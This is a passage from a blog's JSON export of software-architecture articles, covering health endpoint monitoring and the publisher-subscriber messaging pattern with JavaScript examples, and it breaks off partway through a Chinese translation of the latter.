res.status(200).json(status); &#125; catch (error) &#123; res.status(503).json(&#123; status: &#39;unhealthy&#39;, error: error.message &#125;); &#125; &#125; &#125; &#x2F;&#x2F; Register the endpoint app.get(&#39;&#x2F;health&#39;, (req, res) &#x3D;&gt; &#123; healthCheck.checkHealth(req, res); &#125;); Comprehensive Health Checks A robust health endpoint verifies critical dependencies: class ComprehensiveHealthCheck &#123; constructor(database, cache, externalService) &#123; this.database &#x3D; database; this.cache &#x3D; cache; this.externalService &#x3D; externalService; &#125; async checkHealth(req, res) &#123; const checks &#x3D; &#123; status: &#39;healthy&#39;, timestamp: new Date().toISOString(), checks: &#123;&#125; &#125;; &#x2F;&#x2F; Check database connectivity try &#123; await this.database.ping(); checks.checks.database &#x3D; &#123; status: &#39;healthy&#39;, responseTime: await this.measureResponseTime( () &#x3D;&gt; this.database.ping() ) &#125;; &#125; catch (error) &#123; checks.status &#x3D; &#39;unhealthy&#39;; checks.checks.database &#x3D; &#123; status: &#39;unhealthy&#39;, error: error.message &#125;; &#125; &#x2F;&#x2F; Check cache availability try &#123; await this.cache.set(&#39;health_check&#39;, &#39;ok&#39;, 10); const value &#x3D; await this.cache.get(&#39;health_check&#39;); checks.checks.cache &#x3D; &#123; status: value &#x3D;&#x3D;&#x3D; &#39;ok&#39; ? &#39;healthy&#39; : &#39;degraded&#39;, responseTime: await this.measureResponseTime( () &#x3D;&gt; this.cache.get(&#39;health_check&#39;) ) &#125;; &#125; catch (error) &#123; checks.status &#x3D; &#39;degraded&#39;; checks.checks.cache &#x3D; &#123; status: &#39;unhealthy&#39;, error: error.message &#125;; &#125; &#x2F;&#x2F; Check external service try &#123; const response &#x3D; await this.externalService.healthCheck(); checks.checks.externalService &#x3D; &#123; status: response.ok ? &#39;healthy&#39; : &#39;degraded&#39;, responseTime: response.time &#125;; &#125; catch (error) &#123; checks.status &#x3D; &#39;degraded&#39;; checks.checks.externalService &#x3D; &#123; status: &#39;unhealthy&#39;, error: error.message &#125;; &#125; &#x2F;&#x2F; Return appropriate status code const statusCode &#x3D; checks.status &#x3D;&#x3D;&#x3D; &#39;healthy&#39; ? 200 : 503; res.status(statusCode).json(checks); &#125; async measureResponseTime(operation) &#123; const start &#x3D; Date.now(); await operation(); return Date.now() - start; &#125; &#125; Health Check Levels Different endpoints for different purposes: 1. Liveness Probe Answers: “Is the application running?” &#x2F;&#x2F; Minimal check - just verify the process is alive app.get(&#39;&#x2F;health&#x2F;live&#39;, (req, res) &#x3D;&gt; &#123; res.status(200).json(&#123; status: &#39;alive&#39; &#125;); &#125;); 2. Readiness Probe Answers: “Is the application ready to handle requests?” &#x2F;&#x2F; Check if dependencies are available app.get(&#39;&#x2F;health&#x2F;ready&#39;, async (req, res) &#x3D;&gt; &#123; try &#123; &#x2F;&#x2F; Verify critical dependencies await database.ping(); await cache.ping(); res.status(200).json(&#123; status: &#39;ready&#39; &#125;); &#125; catch (error) &#123; &#x2F;&#x2F; Not ready to serve traffic res.status(503).json(&#123; status: &#39;not_ready&#39;, reason: error.message &#125;); &#125; &#125;); 3. Detailed Health Check Answers: “What’s the status of each component?” app.get(&#39;&#x2F;health&#x2F;detailed&#39;, async (req, res) &#x3D;&gt; &#123; const health &#x3D; await comprehensiveHealthCheck.checkAll(); res.status(health.status &#x3D;&#x3D;&#x3D; &#39;healthy&#39; ? 200 : 503).json(&#123; status: health.status, components: &#123; database: health.database, cache: health.cache, messageQueue: health.messageQueue, externalAPIs: health.externalAPIs &#125;, metrics: &#123; requestsPerSecond: metrics.getRequestRate(), averageResponseTime: metrics.getAverageResponseTime(), errorRate: metrics.getErrorRate() &#125; &#125;); &#125;); Response Codes and Their Meanings Use HTTP status codes to communicate health status: class HealthStatusCodes &#123; static OK &#x3D; 200; &#x2F;&#x2F; Everything is healthy static DEGRADED &#x3D; 200; &#x2F;&#x2F; Working but with issues static SERVICE_UNAVAILABLE &#x3D; 503; &#x2F;&#x2F; Critical failure static TIMEOUT &#x3D; 504; &#x2F;&#x2F; Health check took too long static determineStatusCode(checks) &#123; const hasCriticalFailure &#x3D; checks.some( check &#x3D;&gt; check.critical &amp;&amp; check.status &#x3D;&#x3D;&#x3D; &#39;unhealthy&#39; ); if (hasCriticalFailure) &#123; return this.SERVICE_UNAVAILABLE; &#125; const hasNonCriticalFailure &#x3D; checks.some( check &#x3D;&gt; !check.critical &amp;&amp; check.status &#x3D;&#x3D;&#x3D; &#39;unhealthy&#39; ); if (hasNonCriticalFailure) &#123; return this.DEGRADED; &#125; return this.OK; &#125; &#125; Security Considerations Health endpoints can expose sensitive information. Protect them appropriately: 1. Use Authentication for Detailed Checks &#x2F;&#x2F; Public endpoint - minimal information app.get(&#39;&#x2F;health&#39;, (req, res) &#x3D;&gt; &#123; res.status(200).json(&#123; status: &#39;ok&#39; &#125;); &#125;); &#x2F;&#x2F; Protected endpoint - detailed information app.get(&#39;&#x2F;health&#x2F;detailed&#39;, authenticateMonitoring, async (req, res) &#x3D;&gt; &#123; const health &#x3D; await detailedHealthCheck(); res.json(health); &#125;); function authenticateMonitoring(req, res, next) &#123; const token &#x3D; req.headers[&#39;x-monitoring-token&#39;]; if (token !&#x3D;&#x3D; process.env.MONITORING_TOKEN) &#123; return res.status(401).json(&#123; error: &#39;Unauthorized&#39; &#125;); &#125; next(); &#125; 2. Use Obscure Paths &#x2F;&#x2F; Instead of &#x2F;health, use a less obvious path const healthPath &#x3D; process.env.HEALTH_CHECK_PATH || &#39;&#x2F;health&#39;; app.get(healthPath, healthCheckHandler); 3. Rate Limiting const rateLimit &#x3D; require(&#39;express-rate-limit&#39;); const healthCheckLimiter &#x3D; rateLimit(&#123; windowMs: 60 * 1000, &#x2F;&#x2F; 1 minute max: 60, &#x2F;&#x2F; 60 requests per minute message: &#39;Too many health check requests&#39; &#125;); app.get(&#39;&#x2F;health&#39;, healthCheckLimiter, healthCheckHandler); Caching Health Status Avoid overwhelming your system with health checks: class CachedHealthCheck &#123; constructor(ttlSeconds &#x3D; 10) &#123; this.ttl &#x3D; ttlSeconds * 1000; this.cache &#x3D; null; this.lastCheck &#x3D; 0; &#125; async getHealth() &#123; const now &#x3D; Date.now(); &#x2F;&#x2F; Return cached result if still valid if (this.cache &amp;&amp; (now - this.lastCheck) &lt; this.ttl) &#123; return this.cache; &#125; &#x2F;&#x2F; Perform actual health check this.cache &#x3D; await this.performHealthCheck(); this.lastCheck &#x3D; now; return this.cache; &#125; async performHealthCheck() &#123; &#x2F;&#x2F; Actual health check logic return &#123; status: &#39;healthy&#39;, timestamp: new Date().toISOString(), checks: await this.runAllChecks() &#125;; &#125; &#125; &#x2F;&#x2F; Use cached health check const cachedHealth &#x3D; new CachedHealthCheck(10); app.get(&#39;&#x2F;health&#39;, async (req, res) &#x3D;&gt; &#123; const health &#x3D; await cachedHealth.getHealth(); res.status(health.status &#x3D;&#x3D;&#x3D; &#39;healthy&#39; ? 200 : 503).json(health); &#125;); Integration with Load Balancers Load balancers use health checks to route traffic only to healthy instances: # Nginx configuration upstream backend &#123; server app1.example.com:8080; server app2.example.com:8080; server app3.example.com:8080; &#125; server &#123; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;backend; # Health check configuration health_check interval&#x3D;10s fails&#x3D;3 passes&#x3D;2 uri&#x3D;&#x2F;health&#x2F;ready match&#x3D;health_ok; &#125; &#125; # Define what &quot;healthy&quot; means match health_ok &#123; status 200; body ~ &quot;\\&quot;status\\&quot;:\\&quot;ready\\&quot;&quot;; &#125; Monitoring from Multiple Locations Check your application from different geographic locations: graph TB A[Monitoring Service US-East] -->|Check every 30s| B[Application] C[Monitoring Service EU-West] -->|Check every 30s| B D[Monitoring Service Asia-Pacific] -->|Check every 30s| B B --> E[Alert System] E -->|If 2+ locations fail| F[Send Alert] E -->|If 1 location fails| G[Log Warning] style B fill:#4dabf7,stroke:#1971c2 style F fill:#ff6b6b,stroke:#c92a2a style G fill:#ffd43b,stroke:#fab005 class MultiLocationMonitor &#123; constructor(locations) &#123; this.locations &#x3D; locations; this.results &#x3D; new Map(); &#125; async checkAllLocations(endpoint) &#123; const checks &#x3D; this.locations.map(location &#x3D;&gt; this.checkFromLocation(location, endpoint) ); const results &#x3D; await Promise.allSettled(checks); &#x2F;&#x2F; Analyze results const failures &#x3D; results.filter(r &#x3D;&gt; r.status &#x3D;&#x3D;&#x3D; &#39;rejected&#39; || r.value.status !&#x3D;&#x3D; 200 ); if (failures.length &gt;&#x3D; 2) &#123; &#x2F;&#x2F; Multiple locations failing - critical issue await this.sendAlert(&#39;critical&#39;, endpoint, failures); &#125; else if (failures.length &#x3D;&#x3D;&#x3D; 1) &#123; &#x2F;&#x2F; Single location failing - possible network issue await this.sendAlert(&#39;warning&#39;, endpoint, failures); &#125; return results; &#125; async checkFromLocation(location, endpoint) &#123; const start &#x3D; Date.now(); const response &#x3D; await fetch(&#96;$&#123;location.url&#125;$&#123;endpoint&#125;&#96;); const duration &#x3D; Date.now() - start; return &#123; location: location.name, status: response.status, duration, timestamp: new Date().toISOString() &#125;; &#125; &#125; Best Practices 💡 Health Check GuidelinesKeep It Fast: Health checks should complete in under 1 second Check Dependencies: Verify critical components like databases Use Appropriate Timeouts: Don't let health checks hang indefinitely Return Meaningful Status: Use proper HTTP status codes Cache Results: Avoid overwhelming your system with checks Secure Sensitive Endpoints: Protect detailed health information Monitor the Monitors: Ensure your monitoring system is working Common Pitfalls to Avoid ⚠️ What Not to DoDon't Make Health Checks Too Complex: They should be fast and simple Don't Expose Sensitive Data: Avoid revealing internal architecture details Don't Skip Critical Dependencies: If the database is down, report it Don't Ignore Response Times: Slow responses indicate problems Don't Use the Same Endpoint for Everything: Separate liveness from readiness When to Use This Pattern This pattern is essential for: ✅ Web Applications: Verify availability and correct operation ✅ Microservices: Monitor individual service health in distributed systems ✅ Load-Balanced Applications: Enable automatic traffic routing to healthy instances ✅ Auto-Scaling Systems: Determine when to add or remove instances ✅ High-Availability Systems: Detect failures quickly for failover Real-World Example: E-Commerce Platform class ECommerceHealthCheck &#123; constructor(dependencies) &#123; this.database &#x3D; dependencies.database; this.cache &#x3D; dependencies.cache; this.paymentGateway &#x3D; dependencies.paymentGateway; this.inventoryService &#x3D; dependencies.inventoryService; &#125; async checkHealth() &#123; const checks &#x3D; await Promise.allSettled([ this.checkDatabase(), this.checkCache(), this.checkPaymentGateway(), this.checkInventoryService() ]); const [database, cache, payment, inventory] &#x3D; checks; &#x2F;&#x2F; Determine overall health const criticalFailures &#x3D; [database, payment].filter( check &#x3D;&gt; check.status &#x3D;&#x3D;&#x3D; &#39;rejected&#39; ); const status &#x3D; criticalFailures.length &gt; 0 ? &#39;unhealthy&#39; : &#39;healthy&#39;; return &#123; status, timestamp: new Date().toISOString(), components: &#123; database: this.formatCheck(database, true), cache: this.formatCheck(cache, false), paymentGateway: this.formatCheck(payment, true), inventoryService: this.formatCheck(inventory, false) &#125; &#125;; &#125; async checkDatabase() &#123; const start &#x3D; Date.now(); await this.database.query(&#39;SELECT 1&#39;); return &#123; responseTime: Date.now() - start &#125;; &#125; async checkCache() &#123; const start &#x3D; Date.now(); await this.cache.ping(); return &#123; responseTime: Date.now() - start &#125;; &#125; async checkPaymentGateway() &#123; const start &#x3D; Date.now(); const response &#x3D; await this.paymentGateway.healthCheck(); return &#123; responseTime: Date.now() - start, available: response.status &#x3D;&#x3D;&#x3D; &#39;operational&#39; &#125;; &#125; async checkInventoryService() &#123; const start &#x3D; Date.now(); const response &#x3D; await fetch(&#39;http:&#x2F;&#x2F;inventory-service&#x2F;health&#39;); return &#123; responseTime: Date.now() - start, status: response.status &#125;; &#125; formatCheck(check, critical) &#123; if (check.status &#x3D;&#x3D;&#x3D; &#39;fulfilled&#39;) &#123; return &#123; status: &#39;healthy&#39;, critical, ...check.value &#125;; &#125; else &#123; return &#123; status: &#39;unhealthy&#39;, critical, error: check.reason.message &#125;; &#125; &#125; &#125; Conclusion The Health Endpoint Monitoring pattern is your application’s vital signs monitor. Just as doctors use simple checks to assess patient health, monitoring tools use health endpoints to verify your application is functioning correctly. By implementing proper health checks, you can: Detect failures before users encounter them Enable automatic traffic routing to healthy instances Provide visibility into system health Support auto-scaling and self-healing systems Start with simple liveness checks, then gradually add more comprehensive health verification as your system grows. Remember: a healthy application is one that knows when it’s sick. References Health Endpoint Monitoring Pattern - Microsoft Learn Related Patterns: Circuit Breaker Pattern, Sidecar Pattern","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"en"},{"title":"The Publisher-Subscriber Pattern: Decoupling Communication at Scale","slug":"2019/10/Publisher-Subscriber-Pattern","date":"un33fin33","updated":"un55fin55","comments":true,"path":"2019/10/Publisher-Subscriber-Pattern/","permalink":"https://neo01.com/2019/10/Publisher-Subscriber-Pattern/","excerpt":"Enable applications to announce events to multiple consumers asynchronously without coupling senders to receivers. Learn how pub/sub messaging improves scalability and reliability.","text":"Imagine a newspaper publisher. They print the news once, and thousands of subscribers receive it without the publisher knowing who they are or where they live. The publisher doesn’t wait for each subscriber to read the paper before printing the next edition. This is the essence of the Publisher-Subscriber pattern—a powerful approach to decouple communication in distributed systems. The Newspaper Analogy Just as a newspaper works: Publisher creates content once Multiple subscribers receive the same content Publisher doesn’t know individual subscribers Delivery happens asynchronously Subscribers can come and go freely In software, the pub/sub pattern: Sender publishes messages once Multiple consumers receive messages Sender doesn’t know consumer identities Communication is asynchronous Consumers can subscribe/unsubscribe dynamically graph TB P[Publisher] --> IC[Input Channel] IC --> MB{Message Broker} MB --> OC1[Output Channel 1] MB --> OC2[Output Channel 2] MB --> OC3[Output Channel 3] OC1 --> S1[Subscriber 1] OC2 --> S2[Subscriber 2] OC3 --> S3[Subscriber 3] style P fill:#4dabf7,stroke:#1971c2 style MB fill:#ffd43b,stroke:#fab005 style S1 fill:#51cf66,stroke:#2f9e44 style S2 fill:#51cf66,stroke:#2f9e44 style S3 fill:#51cf66,stroke:#2f9e44 The Problem: Tight Coupling in Event Distribution In distributed applications, components often need to notify others when events occur. Traditional approaches create tight coupling and scalability issues. Traditional Approach: Direct Communication class OrderService &#123; async createOrder(orderData) &#123; const order = await this.saveOrder(orderData); // Directly call each dependent service await this.inventoryService.reserveItems(order.items); await this.paymentService.processPayment(order.payment); await this.shippingService.scheduleDelivery(order.address); await this.notificationService.sendConfirmation(order.email); await this.analyticsService.trackOrder(order.id); return order; &#125; &#125; ⚠️ Problems with Direct CommunicationTight Coupling: OrderService must know about all dependent services Blocking: Sender waits for each service to respond Fragility: If any service is down, order creation fails Scalability: Adding new consumers requires modifying the sender Performance: Sequential calls increase response time Dedicated Queues Approach class OrderService &#123; async createOrder(orderData) &#123; const order = await this.saveOrder(orderData); // Send to individual queues await this.inventoryQueue.send(order); await this.paymentQueue.send(order); await this.shippingQueue.send(order); await this.notificationQueue.send(order); await this.analyticsQueue.send(order); return order; &#125; &#125; ⚠️ Problems with Dedicated QueuesQueue Proliferation: One queue per consumer doesn't scale Still Coupled: Sender must know all queue names Maintenance Burden: Adding consumers requires code changes Duplicate Messages: Same message sent multiple times The Solution: Publisher-Subscriber Pattern Introduce a messaging subsystem that decouples publishers from subscribers: class OrderService &#123; constructor(messageBroker) &#123; this.broker = messageBroker; &#125; async createOrder(orderData) &#123; const order = await this.saveOrder(orderData); // Publish once - broker handles distribution await this.broker.publish('orders', &#123; type: 'OrderCreated', data: order, timestamp: new Date().toISOString() &#125;); return order; &#125; &#125; Subscribers register their interest independently: // Inventory Service class InventoryService &#123; constructor(messageBroker) &#123; this.broker = messageBroker; &#125; async start() &#123; await this.broker.subscribe('orders', async (message) => &#123; if (message.type === 'OrderCreated') &#123; await this.reserveItems(message.data.items); &#125; &#125;); &#125; &#125; // Payment Service class PaymentService &#123; async start() &#123; await this.broker.subscribe('orders', async (message) => &#123; if (message.type === 'OrderCreated') &#123; await this.processPayment(message.data.payment); &#125; &#125;); &#125; &#125; // Analytics Service (added later without changing OrderService) class AnalyticsService &#123; async start() &#123; await this.broker.subscribe('orders', async (message) => &#123; if (message.type === 'OrderCreated') &#123; await this.trackOrder(message.data.id); &#125; &#125;); &#125; &#125; Key Components 1. Publisher The component that sends messages: class Publisher &#123; constructor(broker) &#123; this.broker = broker; &#125; async publishEvent(topic, eventType, data) &#123; const message = &#123; id: this.generateMessageId(), type: eventType, data: data, timestamp: new Date().toISOString(), source: 'order-service' &#125;; await this.broker.publish(topic, message); console.log(`Published $&#123;eventType&#125; to $&#123;topic&#125;`); &#125; &#125; 2. Message Broker The intermediary that routes messages: class MessageBroker &#123; constructor() &#123; this.topics = new Map(); &#125; async publish(topic, message) &#123; const subscribers = this.topics.get(topic) || []; // Copy message to all subscribers const deliveryPromises = subscribers.map(subscriber => this.deliverMessage(subscriber, message) ); await Promise.all(deliveryPromises); &#125; async subscribe(topic, handler) &#123; if (!this.topics.has(topic)) &#123; this.topics.set(topic, []); &#125; this.topics.get(topic).push(&#123; id: this.generateSubscriberId(), handler: handler &#125;); &#125; async deliverMessage(subscriber, message) &#123; try &#123; await subscriber.handler(message); &#125; catch (error) &#123; console.error(`Delivery failed to $&#123;subscriber.id&#125;:`, error); // Handle retry logic, dead-letter queue, etc. &#125; &#125; &#125; 3. Subscriber Components that receive messages: class Subscriber &#123; constructor(broker, subscriptionConfig) &#123; this.broker = broker; this.config = subscriptionConfig; &#125; async start() &#123; await this.broker.subscribe( this.config.topic, this.handleMessage.bind(this) ); &#125; async handleMessage(message) &#123; // Filter messages by type if (this.config.messageTypes.includes(message.type)) &#123; await this.processMessage(message); &#125; &#125; async processMessage(message) &#123; // Implement business logic &#125; &#125; Key Benefits 1. Decoupling Publishers and subscribers operate independently: graph LR P1[Order Service] --> MB{Message Broker} P2[User Service] --> MB P3[Payment Service] --> MB MB --> S1[Email Service] MB --> S2[Analytics] MB --> S3[Audit Log] MB --> S4[Reporting] style MB fill:#ffd43b,stroke:#fab005 style P1 fill:#4dabf7,stroke:#1971c2 style P2 fill:#4dabf7,stroke:#1971c2 style P3 fill:#4dabf7,stroke:#1971c2 style S1 fill:#51cf66,stroke:#2f9e44 style S2 fill:#51cf66,stroke:#2f9e44 style S3 fill:#51cf66,stroke:#2f9e44 style S4 fill:#51cf66,stroke:#2f9e44 // Publisher doesn't know about subscribers class OrderService &#123; async createOrder(order) &#123; await this.saveOrder(order); await this.broker.publish('orders', &#123; type: 'OrderCreated', data: order &#125;); // Done! No knowledge of who's listening &#125; &#125; // New subscriber added without changing publisher class FraudDetectionService &#123; async start() &#123; // Subscribe to existing topic await this.broker.subscribe('orders', async (message) => &#123; if (message.type === 'OrderCreated') &#123; await this.checkForFraud(message.data); &#125; &#125;); &#125; &#125; 2. Scalability Handle increased load by scaling subscribers independently: // Scale out specific subscribers based on load class MessageBroker &#123; async subscribe(topic, handler, options = &#123;&#125;) &#123; const subscription = &#123; id: this.generateSubscriberId(), handler: handler, concurrency: options.concurrency || 1 &#125;; // Multiple instances can subscribe to same topic this.topics.get(topic).push(subscription); &#125; &#125; // Deploy multiple instances of slow services for (let i = 0; i &lt; 5; i++) &#123; const emailService = new EmailService(broker); await emailService.start(); // 5 instances processing emails &#125; 3. Reliability System continues operating even when components fail: class ResilientSubscriber &#123; async handleMessage(message) &#123; try &#123; await this.processMessage(message); await this.acknowledgeMessage(message.id); &#125; catch (error) &#123; console.error('Processing failed:', error); // Message remains in queue for retry if (message.retryCount &lt; 3) &#123; await this.requeueMessage(message); &#125; else &#123; // Move to dead-letter queue for investigation await this.moveToDeadLetter(message); &#125; &#125; &#125; &#125; 4. Asynchronous Processing Publishers return immediately without waiting: class OrderService &#123; async createOrder(orderData) &#123; const order = await this.saveOrder(orderData); // Publish and return immediately await this.broker.publish('orders', &#123; type: 'OrderCreated', data: order &#125;); // Return to user without waiting for processing return &#123; orderId: order.id, status: 'processing' &#125;; &#125; &#125; // Subscribers process at their own pace class SlowEmailService &#123; async handleMessage(message) &#123; // Can take minutes to send email await this.sendEmail(message.data.email); // Publisher already returned to user &#125; &#125; Advanced Patterns Topic-Based Routing Organize messages by topic: class TopicBasedBroker &#123; // Publishers send to specific topics async publishToTopic(topic, message) &#123; await this.broker.publish(topic, message); &#125; &#125; // Subscribers choose topics await broker.subscribe('orders.created', handleOrderCreated); await broker.subscribe('orders.cancelled', handleOrderCancelled); await broker.subscribe('payments.processed', handlePaymentProcessed); Content-Based Filtering Subscribers filter by message content: class FilteringSubscriber &#123; async start() &#123; await this.broker.subscribe('orders', async (message) => &#123; // Only process high-value orders if (message.data.total > 1000) &#123; await this.processHighValueOrder(message.data); &#125; &#125;); &#125; &#125; // Another subscriber with different filter class RegionalSubscriber &#123; async start() &#123; await this.broker.subscribe('orders', async (message) => &#123; // Only process orders from specific region if (message.data.region === 'US-WEST') &#123; await this.processRegionalOrder(message.data); &#125; &#125;); &#125; &#125; Wildcard Subscriptions Subscribe to multiple related topics: // Subscribe to all order-related events await broker.subscribe('orders.*', handleOrderEvent); // Subscribe to all events from a service await broker.subscribe('payment-service.*', handlePaymentEvent); // Subscribe to everything (monitoring/logging) await broker.subscribe('*', logAllEvents); Important Considerations Message Ordering Messages may arrive out of order: class OrderAwareSubscriber &#123; constructor() &#123; this.processedMessages = new Set(); &#125; async handleMessage(message) &#123; // Make processing idempotent if (this.processedMessages.has(message.id)) &#123; console.log('Already processed:', message.id); return; &#125; await this.processMessage(message); this.processedMessages.add(message.id); &#125; &#125; Duplicate Messages Handle messages that arrive multiple times: class IdempotentSubscriber &#123; async handleMessage(message) &#123; // Check if already processed const exists = await this.db.findOne(&#123; messageId: message.id &#125;); if (exists) &#123; return; // Skip duplicate &#125; // Process and record await this.processMessage(message); await this.db.insert(&#123; messageId: message.id, processedAt: new Date() &#125;); &#125; &#125; Poison Messages Handle malformed or problematic messages: class SafeSubscriber &#123; async handleMessage(message) &#123; try &#123; await this.validateMessage(message); await this.processMessage(message); &#125; catch (error) &#123; if (this.isUnrecoverable(error)) &#123; // Move to dead-letter queue await this.deadLetterQueue.send(message); console.error('Poison message detected:', message.id); &#125; else &#123; // Retry later throw error; &#125; &#125; &#125; &#125; Message Expiration Handle time-sensitive messages: class ExpirationAwareSubscriber &#123; async handleMessage(message) &#123; const expiresAt = new Date(message.expiresAt); if (Date.now() > expiresAt) &#123; console.log('Message expired:', message.id); return; // Discard expired message &#125; await this.processMessage(message); &#125; &#125; When to Use This Pattern ✅ Use Publisher-Subscriber WhenBroadcasting: Need to send information to multiple consumers Decoupling: Want to develop services independently Scalability: Need to handle varying loads on different components Asynchronous: Don't need immediate responses from consumers Extensibility: Want to add new consumers without changing publishers Event-Driven: Building event-driven architectures ❌ Avoid Publisher-Subscriber WhenFew Consumers: Only 1-2 consumers with very different needs Real-Time Required: Need immediate, synchronous responses Simple Communication: Direct calls would be simpler and sufficient Guaranteed Ordering: Strict message ordering is critical Transactional: Need atomic operations across publisher and subscribers Real-World Example: E-Commerce Order Processing // Order Service publishes events class OrderService &#123; async createOrder(orderData) &#123; const order = await this.db.orders.create(orderData); await this.broker.publish('orders', &#123; type: 'OrderCreated', orderId: order.id, customerId: order.customerId, items: order.items, total: order.total, timestamp: new Date().toISOString() &#125;); return order; &#125; &#125; // Multiple subscribers handle different aspects class InventoryService &#123; async start() &#123; await this.broker.subscribe('orders', async (msg) => &#123; if (msg.type === 'OrderCreated') &#123; await this.reserveInventory(msg.items); &#125; &#125;); &#125; &#125; class PaymentService &#123; async start() &#123; await this.broker.subscribe('orders', async (msg) => &#123; if (msg.type === 'OrderCreated') &#123; await this.chargeCustomer(msg.customerId, msg.total); &#125; &#125;); &#125; &#125; class NotificationService &#123; async start() &#123; await this.broker.subscribe('orders', async (msg) => &#123; if (msg.type === 'OrderCreated') &#123; await this.sendConfirmationEmail(msg.customerId, msg.orderId); &#125; &#125;); &#125; &#125; class AnalyticsService &#123; async start() &#123; await this.broker.subscribe('orders', async (msg) => &#123; if (msg.type === 'OrderCreated') &#123; await this.trackSale(msg.total, msg.items); &#125; &#125;); &#125; &#125; // New service added later without changing OrderService class LoyaltyService &#123; async start() &#123; await this.broker.subscribe('orders', async (msg) => &#123; if (msg.type === 'OrderCreated') &#123; await this.awardPoints(msg.customerId, msg.total); &#125; &#125;); &#125; &#125; Comparison with Related Patterns Publisher-Subscriber vs Observer Pattern The pub/sub pattern builds on the Observer pattern but adds asynchronous messaging and a broker intermediary, providing better decoupling and scalability. Publisher-Subscriber vs Message Queue Message queues typically deliver each message to one consumer (competing consumers), while pub/sub delivers each message to all interested subscribers. Conclusion The Publisher-Subscriber pattern is essential for building scalable, loosely coupled distributed systems. By introducing a message broker between publishers and subscribers, you gain: Independence in development and deployment Ability to scale components individually Resilience to component failures Flexibility to add new functionality without changing existing code When building systems that need to broadcast events to multiple consumers, especially in distributed environments, the Publisher-Subscriber pattern provides a robust foundation for asynchronous, event-driven communication. References Asynchronous Messaging Primer Event-driven architecture style Enterprise integration using message queues and events","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"en"},{"title":"发布者-订阅者模式：大规模解耦通信","slug":"2019/10/Publisher-Subscriber-Pattern-zh-CN","date":"un33fin33","updated":"un55fin55","comments":true,"path":"/zh-CN/2019/10/Publisher-Subscriber-Pattern/","permalink":"https://neo01.com/zh-CN/2019/10/Publisher-Subscriber-Pattern/","excerpt":"让应用程序能够异步地向多个消费者发布事件，而不需要将发送者与接收者耦合在一起。了解发布-订阅消息如何提升可扩展性和可靠性。","text":"想象一家报社。他们印刷一次新闻，成千上万的订阅者就能收到，而报社不需要知道他们是谁或住在哪里。报社不会等待每个订阅者读完报纸才印刷下一期。这就是发布者-订阅者模式的本质——一种在分布式系统中解耦通信的强大方法。 报纸类比 就像报纸的运作方式： 发布者创建一次内容 多个订阅者接收相同内容 发布者不知道个别订阅者 传递是异步的 订阅者可以自由来去 在软件中，发布-订阅模式： 发送者发布一次消息 多个消费者接收消息 发送者不知道消费者身份 通信是异步的 消费者可以动态订阅/取消订阅 graph TB P[发布者] --> IC[输入通道] IC --> MB{消息代理} MB --> OC1[输出通道 1] MB --> OC2[输出通道 2] MB --> OC3[输出通道 3] OC1 --> S1[订阅者 1] OC2 --> S2[订阅者 2] OC3 --> S3[订阅者 3] style P fill:#4dabf7,stroke:#1971c2 style MB fill:#ffd43b,stroke:#fab005 style S1 fill:#51cf66,stroke:#2f9e44 style S2 fill:#51cf66,stroke:#2f9e44 style S3 fill:#51cf66,stroke:#2f9e44 问题：事件分发中的紧密耦合 在分布式应用程序中，组件经常需要在事件发生时通知其他组件。传统方法会造成紧密耦合和可扩展性问题。 传统方法：直接通信 class OrderService &#123; async createOrder(orderData) &#123; const order = await this.saveOrder(orderData); // 直接调用每个依赖服务 await this.inventoryService.reserveItems(order.items); await this.paymentService.processPayment(order.payment); await this.shippingService.scheduleDelivery(order.address); await this.notificationService.sendConfirmation(order.email); await this.analyticsService.trackOrder(order.id); return order; &#125; &#125; ⚠️ 直接通信的问题紧密耦合：OrderService 必须知道所有依赖服务 阻塞：发送者等待每个服务响应 脆弱性：如果任何服务停机，订单创建就会失败 可扩展性：添加消费者需要修改发送者 性能：顺序调用增加响应时间 专用队列方法 class OrderService &#123; async createOrder(orderData) &#123; const order = await this.saveOrder(orderData); // 发送到各个队列 await this.inventoryQueue.send(order); await this.paymentQueue.send(order); await this.shippingQueue.send(order); await this.notificationQueue.send(order); await this.analyticsQueue.send(order); return order; &#125; &#125; ⚠️ 专用队列的问题队列激增：每个消费者一个队列无法扩展 仍然耦合：发送者必须知道所有队列名称 维护负担：添加消费者需要修改代码 重复消息：相同消息发送多次 解决方案：发布者-订阅者模式 引入一个消息子系统，将发布者与订阅者解耦： class OrderService &#123; constructor(messageBroker) &#123; this.broker = messageBroker; &#125; async createOrder(orderData) &#123; const order = await this.saveOrder(orderData); // 发布一次 - 代理处理分发 await this.broker.publish('orders', &#123; type: 'OrderCreated', data: order, timestamp: new Date().toISOString() &#125;); return order; &#125; &#125; 订阅者独立注册他们的兴趣： // 库存服务 class InventoryService &#123; constructor(messageBroker) &#123; this.broker = messageBroker; &#125; async start() &#123; await this.broker.subscribe('orders', async (message) => &#123; if (message.type === 'OrderCreated') &#123; await this.reserveItems(message.data.items); &#125; &#125;); &#125; &#125; // 支付服务 class PaymentService &#123; async start() &#123; await this.broker.subscribe('orders', async (message) => &#123; if (message.type === 'OrderCreated') &#123; await this.processPayment(message.data.payment); &#125; &#125;); &#125; &#125; // 分析服务（稍后添加，无需更改 OrderService） class AnalyticsService &#123; async start() &#123; await this.broker.subscribe('orders', async (message) => &#123; if (message.type === 'OrderCreated') &#123; await this.trackOrder(message.data.id); &#125; &#125;); &#125; &#125; 关键组件 1. 发布者 发送消息的组件： class Publisher &#123; constructor(broker) &#123; this.broker = broker; &#125; async publishEvent(topic, eventType, data) &#123; const message = &#123; id: this.generateMessageId(), type: eventType, data: data, timestamp: new Date().toISOString(), source: 'order-service' &#125;; await this.broker.publish(topic, message); console.log(`已发布 $&#123;eventType&#125; 到 $&#123;topic&#125;`); &#125; &#125; 2. 消息代理 路由消息的中介者： class MessageBroker &#123; constructor() &#123; this.topics = new Map(); &#125; async publish(topic, message) &#123; const subscribers = this.topics.get(topic) || []; // 复制消息到所有订阅者 const deliveryPromises = subscribers.map(subscriber => this.deliverMessage(subscriber, message) ); await Promise.all(deliveryPromises); &#125; async subscribe(topic, handler) &#123; if (!this.topics.has(topic)) &#123; this.topics.set(topic, []); &#125; this.topics.get(topic).push(&#123; id: this.generateSubscriberId(), handler: handler &#125;); &#125; async deliverMessage(subscriber, message) &#123; try &#123; await subscriber.handler(message); &#125; catch (error) &#123; console.error(`传递失败到 